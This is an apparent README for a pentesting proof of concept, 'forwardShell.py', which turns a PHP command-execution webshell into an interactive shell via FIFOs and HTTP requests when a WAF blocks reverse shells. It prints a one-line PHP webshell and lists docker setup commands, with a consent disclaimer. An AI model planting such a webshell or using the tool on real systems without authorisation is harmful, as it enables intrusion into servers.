# Forward Shell

When pentesting, we may encounter difficulties establishing Reverse Shell connections due to WAFs being present. 
Let's say we have the following PHP file on the Web Application we are trying to hack:

´´´php
  <?php system($_GET['cmd']); ?>
´´´

We can execute commands as the server, but this webshell is NOT a tty. It's not a full interactive console. 
If for some reason we couldn't get a Reverse Shell, we can get a Forward Shell with this script by making use of FIFOs and HTTP requests.

## Important

This is just a POC running in local with containers. If u want to use it in a real scenario, please do it with consent and always stay within the law.

## Execution 

´´´bash
git clone https://github.com/0x49414E/forwardShell.py
docker build .
docker run -dit <img>
python3.9 main.py
´´´
